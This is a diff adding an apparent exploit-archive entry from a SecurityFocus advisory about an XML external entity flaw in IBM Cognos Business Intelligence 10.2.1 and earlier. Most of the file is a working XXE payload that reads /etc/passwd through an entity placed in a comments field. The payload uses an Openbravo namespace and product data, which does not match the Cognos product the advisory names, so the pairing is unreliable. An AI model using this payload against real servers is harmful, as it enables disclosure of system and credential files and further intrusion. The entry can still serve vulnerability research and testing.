@@ -1,0 +1,22 @@
+source: http://www.securityfocus.com/bid/63719/info
+
+IBM Cognos Business Intelligence is prone to an information-disclosure vulnerability due to an error when parsing XML external entities.
+
+An attacker can exploit this issue to gain access to sensitive information; this may lead to further attacks.
+
+IBM Cognos Business Intelligence 10.2.1 and prior are vulnerable. 
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+ <!ELEMENT comments ANY >
+ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]>
+
+<ob:Openbravo xmlns:ob="http://www.example.com"
+xmlns:xsi="http://www.example1.com/2001/XMLSchema-instance">
+        <Product id="C970393BDF6C43E2B030D23482D88EED" identifier="Zumo de Piñ,5L">
+                <id>C970393BDF6C43E2B030D23482D88EED</id>
+                <comments>&xxe;</comments>
+        </Product>
+</ob:Openbravo>
+
+
